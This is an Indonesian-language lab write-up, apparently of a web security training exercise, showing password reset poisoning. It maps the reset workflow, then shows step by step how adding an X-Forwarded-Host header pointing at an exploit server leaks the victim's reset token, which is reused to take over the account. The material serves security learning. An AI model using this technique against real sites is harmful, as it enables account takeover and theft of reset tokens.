# LAB 2 Password reset poisoning via middleware

## Brief:
lab rentan dengan password poisoning, user carlos akan mengklik semua email yang dia terima.
	
credentials: 

    wiener:peter
	
## Tujuan:
login ke akun carlos
	
## Analisa:
Untuk memudahkan dan memahami ikuti workflow dari login, logout, dan reset akun
	
#### Step:
		
- A. Ini request Post login untuk login akun
  
	<img width="1920" height="1080" alt="A POST login" src="https://github.com/user-attachments/assets/47aadf96-5a47-4f7c-b5e9-44fe3e2e8d98" />
		
- B. setelah login ini adalah laman dan request GET my-account
  
  <img width="1920" height="1080" alt="B Get myaccount" src="https://github.com/user-attachments/assets/f766a869-b1b6-4e4f-af7b-41af96866889" />

- C. Ini GET request untuk logout

  <img width="1920" height="1080" alt="C logout" src="https://github.com/user-attachments/assets/2714294b-7037-4f5f-a70e-4b35a8052031" />
 
- D. ini request GET untuk mereset tombol forgot-password

  <img width="1920" height="1080" alt="D Get forgot password" src="https://github.com/user-attachments/assets/d121c2de-be7c-4f66-aadd-1abd3c1fff9c" />

  
-	E. ini request POST untuk mereset akun dengan username
  
	<img width="1920" height="1080" alt="E post forgot pass" src="https://github.com/user-attachments/assets/1ade9c27-03b0-4e28-95af-1ba8932c0547" />
		
-	F. ini request GET temp token forgot password
			
  setelah mengklik email untuk mereset akun nanti ada temp token yang akan dimuat, token inilah yang digunakan untu mengganti sandi.
  
  <img width="1920" height="1080" alt="F forgot pass temp token " src="https://github.com/user-attachments/assets/8a996b06-d6e6-407c-b12b-ba1bfafe3c62" />
			
- G. request POST forgot-password?temp-forgot-password-token ini untuk mereset akun dengan mengisi kata sandinya

  <img width="1920" height="1080" alt="G post temp token" src="https://github.com/user-attachments/assets/2f5e07de-e501-45e4-badc-a83ab40fcf27" />

#### Jadi workflow untuk mereset password seperti ini:
		
- user mengklik dan mengirim request GET /forgot-password
			
	setelah itu

- user mengisi dengan username atau email akunnya, lalu mengirim request POST /forgot-password dengan parameter username
			
  situs web akan mengirim link yang berisi token unik ke email user. setelah di klik
			
- user akan mengirim request GET /forgot-password?temp-forgot-password-token=TOKEN 
			
- lalu user akan mengisi password baru dengan request POST /forgot-password?temp-forgot-password-token=TOKEN dan parameter: temp-forgot-password-token=TOKEN&new-password-1=passwordbaru&new-password-2=passwordbaru
			
dan seperti itulah workflownya
		
### kerentanan:
	
-	1. pada POST request di step (E) untuk mereset akun dengan request :

           POST /forgot-password dengan parameter username:
		
		cek bahwa X-Forwarded-Host disupport diheader dengan url yang ada di exploit server
		
		tambahkan X-Forwarded-Host: exploit.server
			
		lalu di akses log ada request yang dikirim ke server

  <img width="1920" height="1080" alt="1 x forwarded host" src="https://github.com/user-attachments/assets/2cb040eb-de68-4256-95b9-f4257430403c" />
		
-	2. sekarang kirim lagi requestnya dan ganti parameter username dengan username carlos:

 	       username=carlos
		
		lalu ke akses log dan ada request dari akun carlos

           GET /forgot-password?temp-forgot-password-token=TOKEN
		
		ini bisa terjadi karna carlos mengklik email yang dia terima untuk mereset password tanpa mengetahui bahwa attacker juga bisa menerima token untuk mereset password
				
		karna request X-Forwarded-Host mengarah ke server attacker
				
		copy tokennya
<img width="1920" height="1080" alt="2 akses log" src="https://github.com/user-attachments/assets/7f440a7b-77d3-47f6-85e7-2246146ef8a7" />

		
-	3. load request step (G)
  
           GET /forgot-password?temp-forgot-password-token=TOKEN

 	dengan token yang di copy sebelumnnya

  <img width="1920" height="1080" alt="3 load temp" src="https://github.com/user-attachments/assets/1b1f0638-2d45-431c-9e95-6d41c8be8015" />
	
-	4. ke step(G) atau kerequest yang digunakan untuk mereset password dengan parameter password barunya:
  
            POST /forgot-password?temp-forgot-password-token=TOKEN
														      
		  dan parameter:

            temp-forgot-password-token=TOKEN&new-password-1=passwordbaru&new-password-2=passwordbaru
		
		ganti kedua parameter token dengan token carlos dan isi password baru lalu kirim request
			
		dan status 302 found

	<img width="1920" height="1044" alt="4 post stolen" src="https://github.com/user-attachments/assets/97baa34e-0483-4995-9991-483722185ee7" />
		
-	5. login dengan akun carlos dan password barunya lalu berhasil

  <img width="1920" height="1080" alt="5 done" src="https://github.com/user-attachments/assets/16efcf38-a064-4243-8c8a-1119b7ae44c0" />
